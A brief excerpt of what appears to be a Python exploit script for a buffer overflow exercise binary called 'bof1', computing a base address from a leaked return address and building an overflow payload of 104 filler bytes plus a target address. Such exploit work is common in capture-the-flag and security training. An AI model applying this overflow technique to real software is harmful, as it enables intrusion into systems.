...
# according to objdump -d bof1 | grep task, we can get the return offset is 9c94 + 5 bytes = 9c99

base_address = ret_addr - 0x9c99
...
leak_message = b'A' * (96 + 8) + target_addr_bytes
